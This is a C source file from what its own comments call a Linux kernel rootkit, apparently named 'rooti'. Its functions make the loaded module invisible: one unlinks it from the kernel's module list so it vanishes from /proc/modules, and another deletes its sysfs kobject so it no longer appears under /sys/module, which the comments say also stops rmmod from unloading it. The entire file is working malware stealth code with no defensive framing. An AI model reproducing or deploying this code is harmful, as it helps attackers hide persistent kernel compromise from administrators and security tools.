#include <linux/module.h>
#include <linux/mutex.h>
#include "module.h"
#include "../../utils.h"

/*
    Removes this module from the kernel list of modules. This makes it so it
    doesn't appear in the output of /proc/modules. This function assumes that module_mutex
    has already been acquired.
*/
static void rooti_hideme_from_procs(void)
{
    list_del_rcu(&THIS_MODULE->list);
    synchronize_rcu();
}

/*
    Removes the kobject associated with this module from the sysfs hierarchy.
    This makes it so the kobject corresponding to this modules doesn't show up
    as a directory under /sys/module. This function assumes that module_mutex
    has already been acquired.
*/
static void rooti_hideme_from_sysfs(void)
{
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

/*
    Hides the rootkit from userspace by removing the corresponding entries in
    both procs and sysfs. This also protects it from unloading via tools like rmmod.
*/
int rooti_hideme()
{
    ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);

    // Remove info about this module from various data structures
    mutex_lock(__module_mutex);
    rooti_hideme_from_procs();
    rooti_hideme_from_sysfs();
    mutex_unlock(__module_mutex);

    return 0;
}